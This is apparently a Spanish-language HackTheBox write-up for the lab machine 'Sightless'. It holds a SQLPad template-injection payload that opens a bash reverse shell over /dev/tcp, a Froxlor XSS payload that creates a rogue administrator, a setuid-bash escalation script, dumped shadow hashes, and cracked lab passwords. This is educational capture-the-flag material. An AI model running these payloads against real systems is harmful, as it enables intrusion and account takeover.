---
title: "Máquina Sightless"
description: "Resolución de la máquina Sightless de HackTheBox"
tags: ["CVE-2022-0944", "Stored credentials", "CVE-2024-34070"]
categories: ["HackTheBox", "Easy", "Linux"]
logo: "/assets/writeups/sightless/logo.webp"
---

En esta máquina abusaremos de un servidor con un SQLPad vulnerable en el cual hay credenciales almacenadas para acceder remotamente a la máquina. Escalaremos privilegios abusando de un Froxlor también desactualizado y con vulnerabilidades presentes.

## Reconocimiento

La máquina tiene 3 puertos abiertos:

```bash
# Nmap 7.95 scan initiated Sat Sep  7 15:00:54 2024 as: nmap -sS -Pn -p- --open -oN ports --min-rate 300 -vvv -n 10.10.11.32
Nmap scan report for 10.10.11.32
Host is up, received user-set (0.44s latency).
Scanned at 2024-09-07 15:00:54 -04 for 146s
Not shown: 60973 closed tcp ports (reset), 4559 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Sep  7 15:03:20 2024 -- 1 IP address (1 host up) scanned in 146.23 seconds
```

Por el FTP no hay acceso anónimo, y en el 80 tenemos un servidor web que nos manda a `sightless.htb`, vamos a agregar este host a nuestro archivo de hosts:

```bash
10.10.11.32 sightless.htb
```
{: file="/etc/hosts" }

Nos dice que es una página de servicio de hosting...

![Portal](/assets/writeups/sightless/1.png)

Más abajo podemos ver concretamente que servicios ofrece, y un enlace que nos manda al nuevo subdominio `sqlpad.sightless.htb`:

![Link](/assets/writeups/sightless/2.png)

Al agregar este otro host y acceder a él, veremos que es un SQLPad que podemos usar sin necesidad de credenciales:

![SQLPad](/assets/writeups/sightless/3.png)

Del resto no hay más nada, así que veamos que hacemos con esto.

## Intrusión

### root - container

La versión de este SQLPad es la `6.10.0`, buscando por vulnerabilidades encontramos el CVE-2022-0944, que se trata de una template injection que nos permitirá llegar a un RCE.

Buscando por los PoCs, encontramos el [siguiente](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944), que simplemente tira al endpoint `/api/test-connection` y le manda un payload para obtener el respectivo RCE. Viendo como funciona podemos ver que lo único que tendriamos que hacer es simplemente introducir esto

{% raw %}
```js
{{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/{args.attacker_ip}/{args.attacker_port} 0>&1"') }}
```
{% endraw %}

En esta parte de la página, especificamente en la opción del driver de conexión para especificar el nombre de la base de datos a usar:

![Vulnerable](/assets/writeups/sightless/4.png)

Al dejar un netcat en escucha, rellenar los campos y ejecutar la petición, efectivamente obtendremos una consola interactiva

```bash
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.32 35582
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad# script /dev/null -c bash # Inicia un nuevo proceso
script /dev/null -c bash
Script started, file is /dev/null
root@c184118df0a6:/var/lib/sqlpad# ^Z # CTRL + Z
[1]  + 22336 suspended  nc -lvnp 443

❯ stty raw -echo; fg # Pasar controles de la terminal
[1]  + 22336 continued  nc -lvnp 443
                                    reset xterm  # Reiniciar la terminal
root@c184118df0a6:/var/lib/sqlpad# export TERM=xterm-256color # Establecer tipo de terminal
root@c184118df0a6:/var/lib/sqlpad# stty rows 34 columns 149 # Establecer filas y columnas
root@c184118df0a6:/var/lib/sqlpad# source /etc/skel/.bashrc # Colores!
```

### michael - sightless

No hay nada interesante en este contenedor, a excepción de los usuarios:

```bash
root@c184118df0a6:/var/lib/sqlpad# ls -la /home
total 20
drwxr-xr-x 1 root    root    4096 Aug  6 11:23 .
drwxr-xr-x 1 root    root    4096 Aug  2 09:30 ..
drwxr-xr-x 2 michael michael 4096 Aug  9 09:42 michael
drwxr-xr-x 1 node    node    4096 Aug  9 09:42 node
```

Como somos root, podemos ver el archivo `shadow` con las contraseñas hasheadas y al verlo podremos notar que este usuario tiene una contraseña acá

```bash
root@c184118df0a6:/var/lib/sqlpad# cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

Vamos a copiarnos este archivo y el `passwd` para intentar hacerle fuerza bruta al hash con la herramienta john. Primero con los dos archivos ya le hacemos un `unshadow`

```bash
❯ unshadow  passwd shadow 
... [snip]
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:1001:1001::/home/michael:/bin/bash
```

Ahora, almacenamos este hash en un archivo y al pasárselo a john nos lo crackeara en poco tiempo. Pasándole el parámetro `--show` junto al hash nos mostrará lo que encontró:

```bash
❯ john hash --show                                                              
michael:insaneclownposse:1001:1001::/home/michael:/bin/bash

1 password hash cracked, 0 left
```

Esta contraseña funciona por SSH:

```bash
❯ /usr/bin/ssh michael@sightless.htb
michael@sightless.htb's password: 
Last login: Fri Jan 10 22:39:08 2025 from 10.10.15.31
michael@sightless:~$
```

Dentro de su directorio personal podremos encontrar la primera flag:

```bash
michael@sightless:~$ ls -la
total 8704
drwxr-x--- 3 michael michael    4096 Jan 10 22:36 .
drwxr-xr-x 4 root    root       4096 May 15  2024 ..
lrwxrwxrwx 1 root    root          9 May 21  2024 .bash_history -> /dev/null
-rw-r--r-- 1 michael michael     220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 michael michael    3771 Jan  6  2022 .bashrc
-rw-r--r-- 1 michael michael     807 Jan  6  2022 .profile
drwx------ 2 michael michael    4096 May 15  2024 .ssh
-rw-r----- 1 root    michael      33 Jan 10 20:05 user.txt
michael@sightless:~$ cat user.txt
2f97c6365d9b8cea1c14158a1f******
```

## Escalada de privilegios

Hay unos puertos que antes no podíamos ver:

```bash
michael@sightless:~$ ss -ltu
Netid         State          Recv-Q         Send-Q                 Local Address:Port                     Peer Address:Port         Process         
udp           UNCONN         0              0                      127.0.0.53%lo:domain                        0.0.0.0:*                            
udp           UNCONN         0              0                            0.0.0.0:bootpc                        0.0.0.0:*                            
tcp           LISTEN         0              4096                       127.0.0.1:3000                          0.0.0.0:*                            
tcp           LISTEN         0              70                         127.0.0.1:33060                         0.0.0.0:*                            
tcp           LISTEN         0              4096                   127.0.0.53%lo:domain                        0.0.0.0:*                            
tcp           LISTEN         0              4096                       127.0.0.1:38881                         0.0.0.0:*                            
tcp           LISTEN         0              511                        127.0.0.1:http-alt                      0.0.0.0:*                            
tcp           LISTEN         0              5                          127.0.0.1:60733                         0.0.0.0:*                            
tcp           LISTEN         0              10                         127.0.0.1:38103                         0.0.0.0:*                            
tcp           LISTEN         0              151                        127.0.0.1:mysql                         0.0.0.0:*                            
tcp           LISTEN         0              511                          0.0.0.0:http                          0.0.0.0:*                            
tcp           LISTEN         0              128                          0.0.0.0:ssh                           0.0.0.0:*                            
tcp           LISTEN         0              128                             [::]:ssh                              [::]:*                            
tcp           LISTEN         0              128                                *:ftp                                 *:*   
```

El puerto 8080 o http-alt es otra web

```bash
michael@sightless:~$ curl -v http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 10 Jan 2025 22:41:38 GMT
< Server: Apache/2.4.52 (Ubuntu)
< Set-Cookie: PHPSESSID=dpj6lfjj9o9gs26hramupfj49b; expires=Fri, 10-Jan-2025 22:51:38 GMT; Max-Age=600; path=/; domain=127.0.0.1; HttpOnly; SameSite=Strict
< Expires: Fri, 10 Jan 2025 22:41:38 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Last-Modified: Fri, 10 Jan 2025 22:41:38 GMT
... [snip]
```

Viendo el contenido del HTML que nos devolvió, podemos ver que se trata de una instancia de [Froxlor](https://www.froxlor.org/). Vamos a verla más a fondo haciendo port-forwading hacia nuestro equipo.

Nos pide credenciales en primera instancia:

![Froxlor login](/assets/writeups/sightless/5.png)

Buscando por vulnerabilidades conocidas, encontramos el `CVE-2024-34070`, que es un XSS en la parte de registros de intentos de autenticación fallidos en la aplicación. Si hay un administrador que mira esta parte de la página y la aplicación es vulnerable, podríamos hacer cosas como crear un nuevo usuario administrativo o reiniciarle la contraseña al ya existente.

En la página de GitHub con el reporte de la vulnerabilidad, podemos encontrar un `payload.txt` que es lo siguiente:

{% raw %}
```js
admin{{$emit.constructor`function+b(){var+metaTag%3ddocument.querySelector('meta[name%3d"csrf-token"]')%3bvar+csrfToken%3dmetaTag.getAttribute('content')%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d"https%3a//demo.froxlor.org/admin_admins.php"%3bvar+params%3d"new_loginname%3dabcd%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d"%2bcsrfToken%2b"%26page%3dadmins%26action%3dadd%26send%3dsend"%3bxhr.open("POST",url,true)%3bxhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")%3balert("Your+Froxlor+Application+has+been+completely+Hacked")%3bxhr.send(params)}%3ba%3db()`()}}
```
{% endraw%}

Esto va a crear un usuario administrador con nombre `abcd` y contraseña `Abcd@@1234` y le mostrará al usuario que su aplicación fue completamente comprometida, vamos a quitarle eso último, cambiarle la URL y colocar esto en el campo de nombre de usuario `loginname` interceptando la petición que se hace al iniciar sesión. Sobre la URL podemos simplemente colocar `admin.sightless.htb:8080` que está en el `/etc/hosts` de la máquina:

```bash
michael@sightless:~$ cat /etc/hosts                                     
127.0.0.1 localhost
127.0.1.1 sightless
127.0.0.1 sightless.htb sqlpad.sightless.htb admin.sightless.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

y es buena idea que usemos la dirección de admin porque si hay alguien viendo los logs, es seguro que esté utilizando este dominio. Al enviar la petición editada, esperando un rato e intentado iniciar sesión con las nuevas credenciales que hemos puesto, ganaremos acceso administrativo:

![Admin panel](/assets/writeups/sightless/6.png)

Podemos ver que hay dos webs por acá...

![Webs](/assets/writeups/sightless/7.png)

Lo interesante es que podemos configurar comandos a ejecutar en la parte de `Settings` del dashboard para componentes como el servidor web, sin embargo nos pide que tengamos activo el A2F:

![OTP](/assets/writeups/sightless/8.png)

Pero en `PHP -> PHP-FPM Versions` tenemos la posibilidad de editar un comando sin necesidad del A2F (aunque esto último puedes activarlo fácilmente):

![Uh](/assets/writeups/sightless/9.png)

> El modo oscuro lo puedes habilitar en las opciones de usuario.
{: .prompt-tip }

No nos permite colocarle cosas extrañas, pero si rutas absolutas a programas o scripts, por lo que si creamos `/tmp/uwu.sh` con permisos de ejecución:

```bash
#!/bin/bash

service php8.1-fpm restart
chmod u+s /bin/bash
```
{: file="/tmp/uwu.sh" }

y le colocamos la ruta del archivo al Froxlor, lo ejecutará al reiniciar el servicio `php-fpm` y por ende:

```bash
michael@sightless:/tmp$ ls -la /usr/bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /usr/bin/bash
```

Ahora podemos simplemente tomar la última flag.

```bash
michael@sightless:/tmp$ bash -p
bash-5.1# cd /root
bash-5.1# ls -al
total 44
drwx------  7 root root 4096 Jan 18 15:02 .
drwxr-xr-x 18 root root 4096 Sep  3 08:20 ..
lrwxrwxrwx  1 root root    9 May 21  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Sep  3 08:18 .cache
drwxr-xr-x  3 root root 4096 Aug  9 11:17 docker-volumes
-rw-------  1 root root   20 Aug  9 10:56 .lesshst
drwxr-xr-x  3 root root 4096 Sep  3 08:28 .local
lrwxrwxrwx  1 root root    9 May 21  2024 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Jan 18 15:02 root.txt
drwxr-xr-x  3 root root 4096 Aug  9 11:17 scripts
drwx------  2 root root 4096 Sep  3 08:30 .ssh
bash-5.1# cat root.txt
f081a9bd92968f21c1d16d16b7******
```

## Extra

La forma en la que escalamos privilegios es una no intencionada junto con lo del A2F.

¿Recuerdas que dije que había otra web configurada y siendo manejada por Froxlor además del propio dashboard? bueno en el mismo panel pudimos apreciar una opción para cambiarle las credenciales a los clientes. Al cambiarle la contraseña al dueño de la página y activarle el FTP, en los archivos de su web veremos que:

```bash
lftp web1@sightless.htb:~> ls
drwxr-xr-x   3 web1     web1         4096 May 17  2024 goaccess
-rw-r--r--   1 web1     web1         8376 Mar 29  2024 index.html
```
> Este servidor FTP te pide que la conexión sea por TLS/SSL, por lo que tendrás que usar
> herramientas como lftp a las cuales debes decirles que no verifiquen el certificado SSL
> ya que está auto-firmado.
{: .prompt-info}

Hay unos archivos, y en la carpeta `goaccess` hay algo jugoso:

```bash
lftp web1@sightless.htb:/goaccess> ls
drwxr-xr-x   2 web1     web1         4096 Aug  2 07:14 backup
lftp web1@sightless.htb:/goaccess> cd backup
lftp web1@sightless.htb:/goaccess/backup> ls
-rw-r--r--   1 web1     web1         5292 Aug  6 14:29 Database.kdb
```

¡Un archivo de KeePass!

Como seguramente está protegido por contraseña, vamos a intentar crackearlo de una con hashcat junto con `keepass2john` a ver si nos devuelve algo, y...:

```bash
❯ hashcat --user -m 13400 hash2 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0  Linux, Release, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i5-6300U CPU @ 2.40GHz, 2860/5784 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c
... [snip]
e43d4d6af579d8bd7716f2a570ba5f818ee5de2e71629e3df44a66950d189d705ea8808df406ebc701c4e3d5892fa5ad1452cc12bf87d79b386a4c55d48bddb0c5db39617d216025c874c08952a97c01fadfe6d65c0a54b9ddaa2b53e928ea11f2831884:bulldogs
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
Hash.Target......: $keepass$*1*600000*0*6a92df8eddaee09f5738d10aadeec3...831884
Time.Started.....: Sat Jan 18 13:50:36 2025 (1 min, 49 secs)
Time.Estimated...: Sat Jan 18 13:52:25 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       19 H/s (11.38ms) @ Accel:256 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344384 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 1024/14344384 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:599936-600000
Candidate.Engine.: Device Generator
Candidates.#1....: kucing -> lovers1
Hardware.Mon.#1..: Temp: 82c Util: 98%

Started: Sat Jan 18 13:50:12 2025
Stopped: Sat Jan 18 13:52:26 2025
```

Nos dice que la contraseña es `bulldogs`.

Al abrirlo, tendremos una entrada que es aparentemnte la contraseña de root junto con su llave SSH como un adjunto:

![Root key](/assets/writeups/sightless/10.png)

